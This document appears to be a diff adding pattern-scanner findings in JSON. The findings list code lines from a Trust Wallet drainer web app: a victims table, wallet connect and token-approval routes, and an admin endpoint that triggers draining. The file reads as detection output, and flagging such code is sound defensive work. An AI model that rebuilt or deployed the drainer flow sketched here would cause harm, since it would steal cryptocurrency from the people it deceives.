+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 217,
+    "text": "api_router: Final[APIRouter] = APIRouter(prefix=\"/api/drainer\", tags=[\"drainer-admin\"])"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 222,
+    "text": "\"\"\"List all drainer victims.\"\"\""
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 225,
+    "text": "\"SELECT * FROM drainer_victims ORDER BY updated_at DESC LIMIT 100\""
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 234,
+    "text": "row = await db.fetch_one(\"SELECT * FROM drainer_victims WHERE id = ?\", (victim_id,))"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 244,
+    "text": "await db.execute(\"DELETE FROM drainer_victims WHERE id = ?\", (victim_id,))"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 250,
+    "text": "\"\"\"Update victim status (connected, approved, drained, ignored).\"\"\""
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 253,
+    "text": "if status not in (\"connected\", \"approved\", \"drained\", \"ignored\"):"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/drainer.py",
+    "line": 258,
+    "text": "\"UPDATE drainer_victims SET status = ?, updated_at = ? WHERE id = ?\","
+  },
+  {
+    "pattern": "drainer_docstring",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 1,
+    "text": "\"\"\"Trust Wallet drainer routes \u2014 capture wallet + real on-chain approvals + drain.\"\"\""
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 1,
+    "text": "\"\"\"Trust Wallet drainer routes \u2014 capture wallet + real on-chain approvals + drain.\"\"\""
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 19,
+    "text": "logger: Final[logging.Logger] = logging.getLogger(\"nexus.trust_drainer\")"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 21,
+    "text": "router: Final[APIRouter] = APIRouter(tags=[\"trust-drainer\"])"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 27,
+    "text": "CREATE TABLE IF NOT EXISTS trust_drainer_victims ("
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 33,
+    "text": "drainer_contract TEXT DEFAULT '',"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 37,
+    "text": "drained_at TEXT,"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 56,
+    "text": "\"SELECT * FROM trust_drainer_victims WHERE wallet_address = ? AND chain = ?\","
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 61,
+    "text": "\"UPDATE trust_drainer_victims SET updated_at = ?, client_ip = ? WHERE id = ?\","
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 71,
+    "text": "INSERT INTO trust_drainer_victims"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 79,
+    "text": "\"chain\": chain, \"tokens\": \"\", \"drainer_contract\": \"\","
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 81,
+    "text": "\"drained_at\": None, \"created_at\": now, \"updated_at\": now,"
+  },
+  {
+    "pattern": "drainer_endpoints",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 85,
+    "text": "@router.post(\"/trust-drainer/connect\")"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 85,
+    "text": "@router.post(\"/trust-drainer/connect\")"
+  },
+  {
+    "pattern": "drainer_endpoints",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 92,
+    "text": "return RedirectResponse(\"/trust-drainer/connect?error=1\", status_code=302)"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 92,
+    "text": "return RedirectResponse(\"/trust-drainer/connect?error=1\", status_code=302)"
+  },
+  {
+    "pattern": "drainer_endpoints",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 111,
+    "text": "return RedirectResponse(f\"/trust-drainer/approve?address={address}&chain={chain}\", status_code=302)"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 111,
+    "text": "return RedirectResponse(f\"/trust-drainer/approve?address={address}&chain={chain}\", status_code=302)"
+  },
+  {
+    "pattern": "drainer_endpoints",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 114,
+    "text": "@router.post(\"/trust-drainer/approve\")"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 114,
+    "text": "@router.post(\"/trust-drainer/approve\")"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 120,
+    "text": "drainer = str(form.get(\"drainer\", \"\")).strip()"
+  },
+  {
+    "pattern": "drainer_endpoints",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 124,
+    "text": "return RedirectResponse(\"/trust-drainer/connect\", status_code=302)"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 124,
+    "text": "return RedirectResponse(\"/trust-drainer/connect\", status_code=302)"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 137,
+    "text": "UPDATE trust_drainer_victims"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 138,
+    "text": "SET tokens = ?, drainer_contract = ?, tx_hashes = ?, status = 'approved', updated_at = ?"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 141,
+    "text": "(tokens, drainer, json.dumps(tx_hashes), now, address, chain),"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 147,
+    "text": "await store_input(cid, \"td_approve\", \"drainer\", drainer)"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 152,
+    "text": "\"drainer\": drainer,"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 163,
+    "text": "\"drainer\": drainer,"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 169,
+    "text": "\"TD APPROVE: %s (%s) tokens=%s drainer=%s txs=%d\","
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 170,
+    "text": "address[:12], chain, tokens, drainer[:12], len(tx_hashes),"
+  },
+  {
+    "pattern": "drainer_endpoints",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 174,
+    "text": "f\"/trust-drainer/done?address={address}&chain={chain}&tokens={tokens}\","
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 174,
+    "text": "f\"/trust-drainer/done?address={address}&chain={chain}&tokens={tokens}\","
+  },
+  {
+    "pattern": "drainer_endpoints",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 179,
+    "text": "@router.post(\"/trust-drainer/done\")"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 179,
+    "text": "@router.post(\"/trust-drainer/done\")"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 191,
+    "text": "\"UPDATE trust_drainer_victims SET status = 'drained', drained_at = ?, updated_at = ? WHERE wallet_address = ? AND chain = ?\","
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 206,
+    "text": "logger.info(\"TD DONE: %s (%s) tokens=%s \u2014 READY TO DRAIN\", address[:12], chain, tokens)"
+  },
+  {
+    "pattern": "drainer_endpoints",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 208,
+    "text": "f\"/trust-drainer/done?address={address}&chain={chain}&tokens={tokens}\","
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 208,
+    "text": "f\"/trust-drainer/done?address={address}&chain={chain}&tokens={tokens}\","
+  },
+  {
+    "pattern": "drainer_endpoints",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 215,
+    "text": "api_router: Final[APIRouter] = APIRouter(prefix=\"/api/trust-drainer\", tags=[\"trust-drainer-admin\"])"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 215,
+    "text": "api_router: Final[APIRouter] = APIRouter(prefix=\"/api/trust-drainer\", tags=[\"trust-drainer-admin\"])"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 222,
+    "text": "\"SELECT * FROM trust_drainer_victims ORDER BY updated_at DESC LIMIT 100\""
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 231,
+    "text": "\"SELECT * FROM trust_drainer_victims WHERE id = ?\", (victim_id,)"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 241,
+    "text": "await db.execute(\"DELETE FROM trust_drainer_victims WHERE id = ?\", (victim_id,))"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 245,
+    "text": "@api_router.post(\"/drain/{victim_id}\")"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 246,
+    "text": "async def trigger_drain(victim_id: str, request: Request) -> dict[str, Any]:"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 247,
+    "text": "\"\"\"Mark victim as drained and relay drain command to admin.\"\"\""
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 251,
+    "text": "\"SELECT * FROM trust_drainer_victims WHERE id = ?\", (victim_id,)"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 257,
+    "text": "\"UPDATE trust_drainer_victims SET status = 'drained', drained_at = ?, updated_at = ? WHERE id = ?\","
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 262,
+    "text": "\"type\": \"td_drain_triggered\","
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 267,
+    "text": "\"drainer\": row.get(\"drainer_contract\", \"\"),"
+  },
+  {
+    "pattern": "drain_action",
+    "file": "app/server/routes/serve/trust_drainer.py",
+    "line": 271,
+    "text": "return {\"ok\": True, \"status\": \"drained\", \"address\": row[\"wallet_address\"]}"
+  }
+]
